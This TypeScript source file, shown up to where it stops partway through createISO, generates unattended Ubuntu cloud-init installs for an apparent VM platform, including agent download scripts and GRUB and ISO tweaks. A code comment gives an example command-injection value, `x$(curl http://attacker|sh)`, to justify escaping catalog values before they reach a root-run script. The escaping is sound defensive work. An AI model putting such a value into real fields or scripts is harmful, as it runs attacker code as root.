import * as fs from 'fs'
import * as path from 'path'
import * as yaml from 'js-yaml'
import * as unixcrypt from 'unixcrypt'
import { Application, PrismaClient } from '@prisma/client'
import { promises as fsPromises } from 'fs'
import { Eta } from 'eta'
import { randomBytes } from 'crypto'
import { deriveVmSecret } from './socket-watcher/AgentMessageSigner'

import { UnattendedManagerBase } from './unattendedManagerBase'
import { type OsProfile } from './install/osProfiles'
import { parseInstallSources, selectInstallSource, type NormalizedInstallSource } from './install/installSources'

export interface CloudInitInstallerOptions {
  /** The resolved OS profile (distro/family/version), drives ISO + source choices. */
  osProfile?: OsProfile
  locale?: string
  keyboard?: string
  timezone?: string
}

/**
 * CloudInitInstaller — generates an unattended Linux install via the cloud-init /
 * subiquity autoinstall mechanism (Ubuntu, Debian, and other NoCloud-seed distros).
 * Mechanism-based and distro-agnostic: the OsProfile + the ISO drive any
 * version/edition-specific choices (e.g. the subiquity `source.id`).
 */
export class CloudInitInstaller extends UnattendedManagerBase {
  private username: string
  private password: string
  private applications: Application[]
  private scripts: any[] = []
  private vmId: string = ''
  private readonly osProfile?: OsProfile
  private readonly locale: string
  private readonly keyboard: string
  private readonly timezone: string
  // The subiquity install source detected from the ISO (set during createISO).
  // Server ISOs have NO 'ubuntu-desktop' source — hardcoding it stalls the install.
  private detectedSource?: string
  // The full normalized source we selected (id + squashfs path + type), used by
  // the post-build integrity check to confirm the required squashfs survived.
  private detectedSourceInfo?: NormalizedInstallSource
  // All normalized sources parsed from the ISO (for layered base-layer lookup).
  private allSources: NormalizedInstallSource[] = []

  constructor (
    username: string,
    password: string,
    applications: Application[],
    vmId?: string,
    scripts: any[] = [],
    opts: CloudInitInstallerOptions = {}
  ) {
    super()
    this.debug.debug('Initializing CloudInitInstaller')
    if (!username || !password) {
      this.debug.error('Username and password are required')
      throw new Error('Username and password are required')
    }
    const family = opts.osProfile?.family ?? 'ubuntu'
    this.isoPath = path.join(path.join(process.env.INFINIBAY_BASE_DIR ?? '/opt/infinibay', 'iso'), `${family}.iso`)
    this.username = username
    this.password = password
    this.applications = applications
    this.vmId = vmId || ''
    this.scripts = scripts
    this.osProfile = opts.osProfile
    // Parameterized like the Kickstart installer (previously hardcoded us/en_US/UTC).
    this.locale = (opts.locale && opts.locale.length > 0) ? opts.locale : 'en_US'
    this.keyboard = (opts.keyboard && opts.keyboard.length > 0) ? opts.keyboard : 'us'
    this.timezone = (opts.timezone && opts.timezone.length > 0) ? opts.timezone : 'UTC'
    this.configFileName = 'user-data'
    this.debug.debug('CloudInitInstaller initialized')
  }

  // Cache the SHA-512 crypt of the password (unixcrypt salts randomly each call, so
  // computing it once keeps every written copy of user-data consistent).
  private _crypted?: string
  private cryptedPassword (): string {
    if (this._crypted === undefined) this._crypted = unixcrypt.encrypt(this.password)
    return this._crypted
  }

  /**
   * Detect a valid subiquity install `source.id` from the extracted ISO's
   * `casper/install-sources.yaml`. Server ISOs expose e.g. `ubuntu-server` /
   * `ubuntu-server-minimal`; Desktop ISOs expose `ubuntu-desktop`. We prefer (in
   * order): the profile's preferred source if present on the ISO, the ISO's own
   * `default: true` entry, then the first non-minimal id, then the first id.
   * Returns undefined when the file is absent/unparseable — the caller then omits
   * `source` entirely and lets subiquity use the ISO default.
   */
  private detectInstallSource (extractDir: string): string | undefined {
    try {
      const p = path.join(extractDir, 'casper', 'install-sources.yaml')
      if (!fs.existsSync(p)) return undefined
      // parseInstallSources handles BOTH the 24.04 top-level-array shape AND the
      // 26.04 `{ sources: [...] }` object shape. The old inline parser assumed an
      // array, so on 26.04 it yielded [] → undefined → subiquity fell back to the
      // ISO default (the *minimized* desktop). See install/installSources.ts.
      const sources = parseInstallSources(fs.readFileSync(p, 'utf8'))
      this.allSources = sources
      if (sources.length === 0) {
        this.debug.warn('[SOURCE] install-sources.yaml parsed to zero sources; letting subiquity use its ISO default')
        return undefined
      }
      const selected = selectInstallSource(sources, {
        preferredId: this.osProfile?.cloudInitPreferredSource,
        expectedEdition: this.osProfile?.expectedEdition
      })
      if (!selected) return undefined
      this.detectedSourceInfo = selected
      // Loud warning when the product wants a desktop but only a minimized (or
      // non-desktop) source is available — the operator gets an actionable signal
      // instead of a silently near-empty system.
      if (this.osProfile?.expectedEdition === 'desktop' && (selected.variant !== 'desktop' || selected.minimal)) {
        this.debug.warn(`[SOURCE] desktop requested but the ISO's best source is '${selected.id}' (variant=${selected.variant || 'n/a'}, minimal=${selected.minimal}); the full desktop may be unavailable on this ISO. Available: ${sources.map(s => s.id).join(', ')}`)
      }
      this.debug.debug(`[SOURCE] selected install source '${selected.id}' (variant=${selected.variant || 'n/a'}, minimal=${selected.minimal}, path=${selected.path || 'n/a'})`)
      return selected.id
    } catch (err) {
      this.debug.warn(`[SOURCE] Could not detect install source from ISO (${String(err)}); letting subiquity use its default`)
      return undefined
    }
  }

  /**
   * Generates a configuration file in YAML format for Ubuntu autoinstall.
   *
   * @returns {Promise<string>} A promise that resolves to the generated configuration file.
   */
  async generateConfig (): Promise<string> {
    // Unique, DNS-safe (RFC-1123) hostname tied to the VM id so two VMs can never
    // clash on the department network; crypto fallback when no vmId. The old
    // Math.random().toString(36).substring(7) yielded only a few chars (sometimes
    // zero), making collisions easy.
    const familyPrefix = this.osProfile?.family ?? 'ubuntu'
    const suffix = (this.vmId || randomBytes(6).toString('hex'))
      .toLowerCase()
      .replace(/[^a-z0-9]/g, '')
      .slice(0, 12)
    const hostname = `${familyPrefix}-${suffix}`

    // The subiquity autoinstall config. Built to install OFFLINE-ROBUSTLY: only
    // the steps needed to put a bootable OS on disk; anything that REQUIRES the
    // internet (restricted codecs/drivers, OEM mode) is omitted so a base install
    // never hangs waiting on a network that may not exist.
    const autoinstall: Record<string, unknown> = {
      version: 1,
      // Let subiquity pick the mirror; geoip degrades gracefully without internet.
      apt: { geoip: true },
      // Reboot into the installed system when finished.
      shutdown: 'reboot',
      identity: {
        hostname,
        realname: this.username,
        username: this.username,
        password: this.cryptedPassword()
      },
      keyboard: { layout: this.keyboard },
      locale: this.locale,
      timezone: this.timezone,
      // Networking is left to subiquity's own DHCP (it brings up en*/eth* itself).
      // The previous early-commands force-ran dhclient + ping/DNS probes that BLOCK
      // when there is no DHCP/internet and fight subiquity's networkd — removed.
      'late-commands': this.generateLateCommands()
    }

    // The `source.id` is ISO/edition-specific (Server ISOs have NO 'ubuntu-desktop'
    // source — hardcoding it STALLS the install). Only set it when we DETECTED a
    // valid source id from the ISO (see detectInstallSource); otherwise subiquity
    // uses the ISO's own default source, which is correct for both editions.
    if (this.detectedSource) {
      autoinstall.source = { id: this.detectedSource, search_drivers: true }
    }

    // Append '#cloud-config' to the beginning of the config
    const configStr = '#cloud-config\n' + yaml.dump({ autoinstall })

    return configStr
  }

  /**
   * Generates late commands for the autoinstall configuration.
   * These commands run during installation but after the system is installed.
   *
   * @returns {string[]} Array of late commands
   */
  private generateLateCommands (): string[] {
    const commands = [
      // Network configuration is now handled by DHCP - no need to manually set DNS
      // Ubuntu's systemd-resolved will use DNS servers from DHCP

      // Create network validation helper script
      `cat > /target/usr/local/bin/wait-for-network.sh << 'NETWORK_HELPER_EOF'
#!/bin/bash
# Network validation helper with exponential backoff
# Usage: wait-for-network.sh [max_attempts] [initial_delay]

MAX_ATTEMPTS=\${1:-15}
INITIAL_DELAY=\${2:-1}
CURRENT_DELAY=\$INITIAL_DELAY

log_network_config() {
    echo "=== Network Configuration Debug Info ==="
    echo "Timestamp: \$(date)"
    echo ""
    echo "--- IP Addresses ---"
    ip addr show || true
    echo ""
    echo "--- Routing Table ---"
    ip route show || true
    echo ""
    echo "--- DNS Configuration ---"
    cat /etc/resolv.conf || true
    echo ""
    echo "--- Active Network Interfaces ---"
    ip link show | grep -E "^[0-9]+:" || true
    echo "========================================"
}

test_connectivity() {
    local test_name=\$1
    local test_command=\$2

    if eval "\$test_command" >/dev/null 2>&1; then
        echo "[OK] \$test_name: SUCCESS"
        return 0
    else
        echo "[FAIL] \$test_name: FAILED"
        return 1
    fi
}

echo "Starting network connectivity validation..."
log_network_config

for attempt in \$(seq 1 \$MAX_ATTEMPTS); do
    echo ""
    echo "Attempt \$attempt/\$MAX_ATTEMPTS (delay: \${CURRENT_DELAY}s)"

    # Test multiple connectivity methods
    PING_PASSED=0
    DNS_PASSED=0

    # Test 1: Ping Google DNS
    test_connectivity "Ping 8.8.8.8" "ping -c 1 -W 2 8.8.8.8" && PING_PASSED=1

    # Test 2: Ping Cloudflare DNS
    if [ \$PING_PASSED -eq 0 ]; then
        test_connectivity "Ping 1.1.1.1" "ping -c 1 -W 2 1.1.1.1" && PING_PASSED=1
    fi

    # Test 3: DNS Resolution (REQUIRED for success)
    # Use getent hosts instead of nslookup as it's available by default (nslookup requires dnsutils)
    test_connectivity "DNS Resolution" "getent hosts archive.ubuntu.com" && DNS_PASSED=1

    # Success requires: Ping must pass AND DNS must pass
    if [ \$PING_PASSED -eq 1 ] && [ \$DNS_PASSED -eq 1 ]; then
        echo ""
        echo "[OK] Network connectivity validated (Ping + DNS passed)"
        log_network_config
        exit 0
    fi

    if [ \$PING_PASSED -eq 0 ]; then
        echo "Network unreachable - no IP connectivity"
    fi
    if [ \$DNS_PASSED -eq 0 ]; then
        echo "DNS resolution FAILED - this is required for apt/downloads to work"
    fi
    echo "Tests passed: Ping=\$PING_PASSED, DNS=\$DNS_PASSED, retrying..."

    # Exponential backoff with max delay of 30s
    sleep \$CURRENT_DELAY
    CURRENT_DELAY=\$((CURRENT_DELAY * 2))
    [ \$CURRENT_DELAY -gt 30 ] && CURRENT_DELAY=30
done

echo ""
echo "[FAIL] Network connectivity validation FAILED after \$MAX_ATTEMPTS attempts"
log_network_config
exit 1
NETWORK_HELPER_EOF`,

      'chmod +x /target/usr/local/bin/wait-for-network.sh',

      // Validate network connectivity before attempting any network operations
      'echo "=== Validating network connectivity before package installation ==="',
      'curtin in-target -- /usr/local/bin/wait-for-network.sh 15 1',

      // Ensure network is still working after early-commands
      'echo "=== Re-validating network before package installation ==="',
      'curtin in-target -- systemctl status systemd-networkd || curtin in-target -- systemctl restart systemd-networkd',
      'sleep 3',

      // Install required packages (must be in late-commands after apt is configured)
      // Desktop ISOs don't include curl/wget, and packages: section may run before apt has repository access
      'curtin in-target -- apt-get update',
      'curtin in-target -- apt-get install -y curl wget qemu-guest-agent',
      'curtin in-target -- systemctl enable qemu-guest-agent',

      // Create directory for per-instance scripts
      'mkdir -p /target/var/lib/cloud/scripts/per-instance',

      // Install InfiniService (the in-guest agent). This connects over the
      // org.infinibay.agent virtio-serial channel on first boot; its first message
      // is what flips the VM's setupComplete=true and drives status transitions.
      // WITHOUT this the OS installs fine but the VM never reports "ready" — the
      // install script was previously generated but never spread into late-commands
      // (lost in the CloudInitInstaller refactor), so infiniservice was never
      // installed. curl/wget were installed above and the network was validated, so
      // the in-target download can run here.
      ...this.generateInfiniServiceInstallCommands(),

      // Create post-installation script
      `cat > /target/var/lib/cloud/scripts/per-instance/post_install.py << 'EOF'
${this.generateMasterInstallScript()}
EOF`,

      // Make the script executable
      'chmod +x /target/var/lib/cloud/scripts/per-instance/post_install.py',

      // Create individual application installation scripts
      ...this.generateAppScriptCommands(),

      // Run the post-installation script
      'curtin in-target -- /var/lib/cloud/scripts/per-instance/post_install.py',

      // Log final network status
      'echo "=== Final Network Status ==="',
      'curtin in-target -- /usr/local/bin/wait-for-network.sh 5 1 || echo "Warning: Network validation failed at end of installation"',
      'echo "=== Installation Complete ==="'
    ]

    return commands
  }

  /**
   * Generates commands to install InfiniService on Ubuntu.
   * Downloads the binary and installation script from the backend server.
   *
   * @returns Array of late commands for InfiniService installation
   */
  private generateInfiniServiceInstallCommands (): string[] {
    const backendPort = process.env.PORT || '4000'
    // Fallback ONLY. The real host is resolved at runtime inside the guest as its
    // default gateway (see below) — APP_HOST is the host's LAN IP and is NOT
    // routable from the VM's isolated department network (it times out).
    const fallbackHost = process.env.APP_HOST || 'localhost'

    // Per-VM HMAC secret derived from the host master secret. The installer
    // reads it from its environment and writes it to a root-only EnvironmentFile.
    // Derived value is hex ([0-9a-f]), safe to single-quote.
    const agentSecret = deriveVmSecret(this.vmId)
    const agentSecretExport = agentSecret
      ? `export INFINISERVICE_SHARED_SECRET='${agentSecret}'`
      : '# INFINISERVICE_SHARED_SECRET not provisioned (no master secret); agent will run LOCKED'

    const commands = [
      // The installer script. It resolves the backend from the VM's DEFAULT GATEWAY
      // (the department bridge IP, where the backend listens on :PORT) — NOT
      // APP_HOST, which is the host's LAN IP and is unreachable from the VM's
      // isolated department network. `set -o pipefail` makes a failing `curl | tee`
      // actually fail (previously the pipe returned tee's success, masking the
      // curl error → it "succeeded" then chmod'd a non-existent file → the whole
      // OS install aborted). It runs both as a curtin in-target fast path AND as a
      // first-boot systemd oneshot, so a transient installer-time network failure
      // never fails the OS install.
      `cat > /target/var/lib/cloud/scripts/per-instance/install_infiniservice.sh << 'EOF'
#!/bin/bash
set -o pipefail

LOG_FILE="/var/log/infiniservice_install.log"
MAX_DOWNLOAD_RETRIES=5
RETRY_DELAY=3

log_message() {
    echo "\$(date '+%Y-%m-%d %H:%M:%S') - \$1" | tee -a "\$LOG_FILE"
}

# The VM reaches the backend at its default gateway (= the department bridge IP,
# where the backend binds :${backendPort}); it is on the same L2 segment so it is
# always reachable, unlike the host LAN IP. Fall back to the configured host only
# when there is no default route.
GW="\$(ip route 2>/dev/null | awk '/^default/{print \$3; exit}')"
BACKEND_HOST="\${GW:-${fallbackHost}}"
BASE_URL="http://\${BACKEND_HOST}:${backendPort}"
log_message "InfiniService backend: \$BASE_URL (gateway=\${GW:-none})"

download_with_retry() {
    local url=\$1
    local output=\$2
    local description=\$3
    local current_delay=\$RETRY_DELAY

    for attempt in \$(seq 1 \$MAX_DOWNLOAD_RETRIES); do
        log_message "Downloading \$description (attempt \$attempt/\$MAX_DOWNLOAD_RETRIES) from \$url ..."
        # No pipe here: the if must see curl's OWN exit status, not tee's.
        if curl -fsS --connect-timeout 10 --max-time 120 -o "\$output" "\$url" 2>>"\$LOG_FILE"; then
            log_message "[OK] \$description downloaded"
            return 0
        fi
        log_message "[FAIL] download failed (exit \$?), retrying in \${current_delay}s..."
        sleep \$current_delay
        current_delay=\$((current_delay * 2))
        [ \$current_delay -gt 30 ] && current_delay=30
    done
    log_message "[FAIL] could not download \$description after \$MAX_DOWNLOAD_RETRIES attempts"
    return 1
}

log_message "=== Starting InfiniService installation ==="

mkdir -p /tmp/infiniservice
cd /tmp/infiniservice || exit 1

if ! download_with_retry "\${BASE_URL}/infiniservice/linux/binary" "infiniservice" "InfiniService binary"; then exit 1; fi
if ! download_with_retry "\${BASE_URL}/infiniservice/linux/script" "install-linux.sh" "InfiniService installer"; then exit 1; fi

chmod +x infiniservice install-linux.sh || exit 1

# Provide the per-VM HMAC secret to the installer (root-only EnvironmentFile).
${agentSecretExport}

log_message "Installing InfiniService (VM ${this.vmId})"
if ./install-linux.sh normal "${this.vmId}" 2>&1 | tee -a "\$LOG_FILE"; then
    log_message "[OK] InfiniService installed"
else
    log_message "[FAIL] InfiniService install script failed"
    exit 1
fi

cd /
rm -rf /tmp/infiniservice
# Success — stop the first-boot retry oneshot from running on later boots.
systemctl disable infiniservice-install.service 2>/dev/null || true
log_message "=== InfiniService installation completed ==="
EOF`,
      'chmod +x /target/var/lib/cloud/scripts/per-instance/install_infiniservice.sh',

      // First-boot retry oneshot: the GUARANTEED path. Desktop images may not re-run
      // cloud-init per-instance scripts on later boots, so we install a systemd unit
      // that runs the installer once the network is up in the fully-booted system.
      // It self-disables on success (above). This makes infiniservice installation
      // independent of installer-time backend reachability.
      `cat > /target/etc/systemd/system/infiniservice-install.service << 'EOF'
[Unit]
Description=Install Infinibay InfiniService agent (first boot)
After=network-online.target
Wants=network-online.target
ConditionPathExists=/var/lib/cloud/scripts/per-instance/install_infiniservice.sh

[Service]
Type=oneshot
ExecStart=/var/lib/cloud/scripts/per-instance/install_infiniservice.sh
TimeoutStartSec=300

[Install]
WantedBy=multi-user.target
EOF`,
      'curtin in-target -- systemctl enable infiniservice-install.service',

      // Fast path — try to install now, but NON-FATAL: if the installer environment
      // can't reach the backend the OS install STILL completes and the oneshot above
      // installs infiniservice on first boot.
      'curtin in-target -- /var/lib/cloud/scripts/per-instance/install_infiniservice.sh || echo "[infinibay] in-target infiniservice install failed; first-boot oneshot will retry"'
    ]

    return commands
  }


  /**
   * Generates commands to create individual application installation scripts.
   *
   * @returns {string[]} Array of commands to create application scripts
   */
  private generateAppScriptCommands (): string[] {
    return this.applications.map((app, index) => {
      const scriptContent = this.generateAppInstallScript(app)
      if (!scriptContent) return ''

      const scriptName = `app_install_${app.name.replace(/[^a-zA-Z0-9]+/g, '_')}.sh`
      return `cat > /target/var/lib/cloud/scripts/per-instance/${scriptName} << 'EOF'
${scriptContent}
EOF
chmod +x /target/var/lib/cloud/scripts/per-instance/${scriptName}`
    }).filter(cmd => cmd !== '')
  }

  /**
   * Generates a master installation script that runs all application installation scripts.
   *
   * @returns {string} The master installation script
   */
  private generateMasterInstallScript (): string {
    // Get application scripts that have valid installation commands
    const appScripts = this.applications
      .filter(app => this.getUbuntuInstallCommand(app))
      .map(app => ({
        name: app.name,
        scriptName: app.name.replace(/\s+/g, '_')
      }))

    // Initialize Eta template engine
    const eta = new Eta({
      views: path.join(process.env.INFINIBAY_BASE_DIR ?? path.join(__dirname, '..'), 'templates'),
      cache: true
    })

    // Render the template with our data
    try {
      const templatePath = path.join(__dirname, '../templates/post_install.py.eta')
      const templateContent = fs.readFileSync(templatePath, 'utf8')

      // Render the template with our data
      return eta.renderString(templateContent, { appScripts })
    } catch (error) {
      this.debug.error(`Failed to render post_install template: ${error}`)
      throw error
    }
  }

  /**
   * Single-quote-escapes a value for safe embedding in a bash script. Application
   * catalog values (name/parameters) are GLOBAL and cross-tenant and end up in a
   * script that runs as ROOT in the guest during install; wrapping them in a
   * hardened single-quoted literal ('\'' for each embedded quote) prevents command
   * injection (e.g. a name like `x$(curl http://attacker|sh)`).
   */
  private bashSingleQuote (s: unknown): string {
    return `'${String(s).replace(/'/g, "'\\''")}'`
  }

  /**
   * Generates an installation script for a specific application.
   *
   * @param {Application} app - The application to generate a script for
   * @returns {string} The installation script or empty string if no command is available
   */
  private generateAppInstallScript (app: Application): string {
    const installCommand = this.getUbuntuInstallCommand(app)
    if (!installCommand) return ''

    const parsedCommand = this.parseInstallCommand(installCommand, app.parameters)

    // app.name comes from the GLOBAL, cross-tenant Application catalog and is written
    // verbatim into a script that runs as ROOT in the guest. Escape it before
    // embedding: a single-quoted literal for the echo lines, a newline-stripped form
    // for the inert comment (comments can't be quote-escaped, but a newline would let
    // a crafted name break out), and an alphanumeric token for the log filename.
    const nameArg = this.bashSingleQuote(app.name)
    const nameComment = String(app.name).replace(/[\r\n]+/g, ' ')
    const logSafeName = String(app.name).replace(/[^a-zA-Z0-9]+/g, '_')

    return `#!/bin/bash
# Installation script for ${nameComment}
echo "Starting installation of "${nameArg}"..."
LOG_FILE="/var/log/app_install_${logSafeName}.log"

{
  ${parsedCommand}
  if [ $? -eq 0 ]; then
    echo ${nameArg}" installation completed successfully"
  else
    echo ${nameArg}" installation failed with exit code $?"
  fi
} 2>&1 | tee -a $LOG_FILE
`
  }

  /**
   * Parses an installation command, replacing placeholders with actual parameters.
   *
   * @param {string} command - The command template
   * @param {any} parameters - Parameters to substitute in the command
   * @returns {string} The parsed command
   */
  private parseInstallCommand (command: string, parameters: any = null): string {
    // Replace placeholders with actual parameters. Parameters come from the GLOBAL,
    // cross-tenant Application catalog and end up in a root-run guest script, so:
    //  - only accept safe placeholder keys — a key like '(' would crash `new RegExp`
    //    with a SyntaxError and abort the whole VM create, and regex metacharacters
    //    would mis-substitute; validate the key and use a literal split/join instead;
    //  - single-quote-escape each value so it cannot break out and run as root.
    let parsedCommand = command
    if (parameters && typeof parameters === 'object') {
      for (const [key, value] of Object.entries(parameters)) {
        if (!/^[A-Za-z0-9_]+$/.test(key)) continue
        const placeholder = `{{${key}}}`
        parsedCommand = parsedCommand.split(placeholder).join(this.bashSingleQuote(value))
      }
    }
    return parsedCommand
  }

  /**
   * Gets the Ubuntu installation command for an application.
   *
   * @param {Application} app - The application
   * @returns {string | undefined} The installation command or undefined if not available
   */
  private getUbuntuInstallCommand (app: Application): string | undefined {
    if (!app.installCommand || typeof app.installCommand !== 'object') {
      return undefined
    }

    const installCommands = app.installCommand as Record<string, string>
    return installCommands.ubuntu
  }

  /**
   * Modifies the GRUB configuration to add autoinstall options.
   * Sets timeout and default entry for automatic boot without user intervention.
   *
   * @param {string} grubCfgPath - Path to the GRUB configuration file
   * @param {string} vmlinuzPath - Path to the kernel (relative to ISO root)
   * @param {string} initrdPath - Path to the initrd (relative to ISO root)
   * @returns {Promise<void>}
   */
  private async modifyGrubConfig (
    grubCfgPath: string,
    vmlinuzPath: string = '/casper/vmlinuz',
    initrdPath: string = '/casper/initrd'
  ): Promise<void> {
    try {
      let content = await fsPromises.readFile(grubCfgPath, 'utf8')
      this.debug.debug(`[GRUB] Original config (first 500 chars):\n${content.substring(0, 500)}...`)

      // Set timeout for automatic boot (like Fedora does)
      const timeoutRegex = /^\s*set\s+timeout\s*=\s*\d+\s*$/gm
      if (timeoutRegex.test(content)) {
        content = content.replace(timeoutRegex, (match) => {
          const indent = match.match(/^\s*/)?.[0] || ''
          this.debug.debug(`[GRUB] Changing timeout: ${match.trim()} -> ${indent}set timeout=3`)
          return `${indent}set timeout=3`
        })
      } else {
        // Add timeout setting if not found - insert after first few lines
        const lines = content.split('\n')
        let insertIndex = 0

        // Find a good insertion point - after initial comments and set commands
        for (let i = 0; i < Math.min(10, lines.length); i++) {
          if (lines[i].trim().startsWith('set ') || lines[i].trim().startsWith('#')) {
            insertIndex = i + 1
          }
        }

        lines.splice(insertIndex, 0, 'set timeout=3')
        content = lines.join('\n')
        this.debug.debug(`[GRUB] Added timeout setting at line ${insertIndex + 1}: set timeout=3`)
      }

      // Create a new autoinstall entry with set default=0 to auto-select it
      // The entry is prepended so it becomes the first (index 0) menu entry
      const newEntry = `
# Added by Infinibay for autoinstall
set default=0
menuentry "Automatic Install Ubuntu" {
  set gfxpayload=keep
  linux ${vmlinuzPath} autoinstall ds=nocloud\\;s=/cdrom/nocloud/ ---
  initrd ${initrdPath}
}

`

      const newContent = newEntry + content
      await fsPromises.writeFile(grubCfgPath, newContent, 'utf8')
      this.debug.debug(`[GRUB] Modified config (first 500 chars):\n${newContent.substring(0, 500)}...`)
      this.debug.debug(`[GRUB] Added autoinstall entry with auto-boot (default=0, timeout=3) to ${grubCfgPath}`)
    } catch (error) {
      this.debug.error(`[GRUB] Failed to modify GRUB configuration: ${error}`)
      throw error
    }
  }

  /**
   * Finds the first file matching a pattern in a directory.
   *
   * @param {string} dir - Directory to search
   * @param {RegExp} pattern - Pattern to match
   * @returns {Promise<string|null>} - Relative path to the file or null if not found
   */
  private async findFirstFile (dir: string, pattern: RegExp): Promise<string|null> {
    try {
      const files = await fsPromises.readdir(dir)
      const match = files.find(file => pattern.test(file))
      return match || null
    } catch (error) {
      this.debug.error(`Error finding file in ${dir}: ${error}`)
      return null
    }
  }

  /**
   * Finds the kernel (vmlinuz) and initrd paths in the extracted ISO.
   * Checks standard locations used by Ubuntu live ISOs.
   *
   * @param {string} extractDir - The directory containing the extracted ISO
   * @returns {Promise<{vmlinuz: string, initrd: string}>} - Paths relative to ISO root
   */
  private async findKernelPaths (extractDir: string): Promise<{vmlinuz: string, initrd: string}> {
    // Standard locations for Ubuntu live ISOs
    const searchPaths = [
      { vmlinuz: '/casper/vmlinuz', initrd: '/casper/initrd' }, // Ubuntu Desktop/Server live
      { vmlinuz: '/casper/vmlinuz.efi', initrd: '/casper/initrd.lz' }, // Older Ubuntu
      { vmlinuz: '/install/vmlinuz', initrd: '/install/initrd.gz' }, // Alternative installer
      { vmlinuz: '/boot/vmlinuz', initrd: '/boot/initrd' } // Fallback
    ]

    for (const paths of searchPaths) {
      const vmlinuzPath = path.join(extractDir, paths.vmlinuz.substring(1))
      const initrdPath = path.join(extractDir, paths.initrd.substring(1))

      if (fs.existsSync(vmlinuzPath) && fs.existsSync(initrdPath)) {
        this.debug.debug(`[KERNEL] Found kernel at ${paths.vmlinuz} and initrd at ${paths.initrd}`)
        return paths
      }
    }

    // If standard paths not found, search for files
    this.debug.debug('[KERNEL] Standard paths not found, searching for kernel files...')

    // Check casper directory first (most common for Ubuntu)
    const casperDir = path.join(extractDir, 'casper')
    if (fs.existsSync(casperDir)) {
      const files = await fsPromises.readdir(casperDir)

      const vmlinuzFile = files.find(f => f.startsWith('vmlinuz'))
      const initrdFile = files.find(f => f.startsWith('initrd'))

      if (vmlinuzFile && initrdFile) {
        const result = {
          vmlinuz: `/casper/${vmlinuzFile}`,
          initrd: `/casper/${initrdFile}`
        }
        this.debug.debug(`[KERNEL] Found kernel: ${result.vmlinuz}, initrd: ${result.initrd}`)
        return result
      }
    }

    // Default fallback
    this.debug.debug('[KERNEL] Using default paths: /casper/vmlinuz, /casper/initrd')
    return { vmlinuz: '/casper/vmlinuz', initrd: '/casper/initrd' }
  }

  /**
   * Parses a shell-style argument string respecting single and double quotes.
   * For example: "-V 'Ubuntu 25.10 amd64'" becomes ["-V", "Ubuntu 25.10 amd64"]
   *
   * @param {string} line - The line to parse
   * @returns {string[]} - Array of parsed arguments
   */
  private parseShellArgs (line: string): string[] {
    const args: string[] = []
    let current = ''
    let inSingleQuote = false
    let inDoubleQuote = false

    for (let i = 0; i < line.length; i++) {
      const char = line[i]

      if (char === "'" && !inDoubleQuote) {
        inSingleQuote = !inSingleQuote
        // Don't include the quote character in the argument
      } else if (char === '"' && !inSingleQuote) {
        inDoubleQuote = !inDoubleQuote
        // Don't include the quote character in the argument
      } else if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
        // Space outside quotes - end current argument
        if (current.length > 0) {
          args.push(current)
          current = ''
        }
      } else {
        current += char
      }
    }

    // Don't forget the last argument
    if (current.length > 0) {
      args.push(current)
    }

    return args
  }

  /**
   * Extracts xorriso parameters from the original ISO using report_el_torito.
   * This ensures the rebuilt ISO has correct boot parameters matching the original.
   *
   * @param {string} isoPath - Path to the original ISO
   * @returns {Promise<string[]>} - Array of xorriso command arguments
   */
  private async getXorrisoParamsFromISO (isoPath: string): Promise<string[]> {
    try {
      this.debug.debug(`[XORRISO] Extracting boot parameters from: ${isoPath}`)

      // Run xorriso to get the mkisofs-compatible parameters
      const output = await this.executeCommand([
        'xorriso', '-indev', isoPath, '-report_el_torito', 'as_mkisofs'
      ])

      this.debug.debug(`[XORRISO] Raw report_el_torito output:\n${output}`)

      // Parse the output to extract useful parameters
      // The output contains mkisofs-style arguments that we can use
      const lines = output.split('\n').filter(line => line.trim())

      // Build the command from the report
      const params: string[] = []

      for (const line of lines) {
        // Skip comment lines
        if (line.trim().startsWith('#')) continue

        // Each line is a mkisofs-compatible argument
        // Parse it respecting quoted strings (e.g., Volume ID with spaces)
        const trimmedLine = line.trim()
        if (trimmedLine) {
          // Use shell-style argument parsing to handle quotes properly
          const parts = this.parseShellArgs(trimmedLine)
          params.push(...parts)
        }
      }

      this.debug.debug(`[XORRISO] Extracted ${params.length} parameters: ${params.join(' ')}`)
      return params
    } catch (error) {
      this.debug.error(`[XORRISO] Failed to extract parameters from ISO: ${error}`)
      // Return empty array, caller will use default parameters
      return []
    }
  }

  /**
   * Creates a new ISO image with the autoinstall configuration.
   *
   * @param {string} newIsoPath - The path to the new ISO image file
   * @param {string} extractDir - The directory containing the extracted ISO
   * @returns {Promise<void>}
   */
  async createISO (newIsoPath: string, extractDir: string): Promise<void> {
    // Ensure the extractDir exists and has content
    if (!fs.existsSync(extractDir)) {
      throw new Error('Extraction directory does not exist.')
    }

    this.debug.debug('[ISO] Creating autoinstall configuration files...')

    // Create nocloud directory for autoinstall files as per Ubuntu documentation
    const noCloudDir = path.join(extractDir, 'nocloud')
    await fsPromises.mkdir(noCloudDir, { recursive: true })

    // Detect the ISO's valid subiquity install source BEFORE generating the config,
    // so we never request a source the ISO doesn't have (which stalls the install).
    this.detectedSource = this.detectInstallSource(extractDir)
    this.debug.debug(`[SOURCE] install source.id = ${this.detectedSource ?? '(subiquity default)'}`)

    // Generate the configuration once and reuse it
    const config = await this.generateConfig()

    // Create required files in nocloud directory
    await fsPromises.writeFile(path.join(noCloudDir, 'meta-data'), '')
    await fsPromises.writeFile(path.join(noCloudDir, 'user-data'), config)
    await fsPromises.writeFile(path.join(noCloudDir, 'vendor-data'), '')
    this.debug.debug('[NOCLOUD] Files created: user-data, meta-data, vendor-data in /nocloud/')

    // Also place copies in the root directory for compatibility
    await fsPromises.writeFile(path.join(extractDir, 'meta-data'), '')
    await fsPromises.writeFile(path.join(extractDir, 'user-data'), config)
    await fsPromises.writeFile(path.join(extractDir, 'vendor-data'), '')
    this.debug.debug('[NOCLOUD] Files also created at root for compatibility')

    // Find kernel paths dynamically
    const kernelPaths = await this.findKernelPaths(extractDir)

    // Find and modify GRUB configurations
    const grubCfgPath = path.join(extractDir, 'boot/grub/grub.cfg')
    if (fs.existsSync(grubCfgPath)) {
      await this.modifyGrubConfig(grubCfgPath, kernelPaths.vmlinuz, kernelPaths.initrd)
      this.debug.debug(`[GRUB] Modified GRUB configuration at ${grubCfgPath}`)
    } else {
      this.debug.warn('[GRUB] Could not find GRUB configuration file at expected path')
    }

    this.debug.debug('[ISO] Examining ISO structure...')

    // Check for crucial paths and files
    if (!fs.existsSync(path.join(extractDir, 'boot/grub/i386-pc/eltorito.img'))) {
      this.debug.warn('[ISO] BIOS boot image not found at boot/grub/i386-pc/eltorito.img')
    }

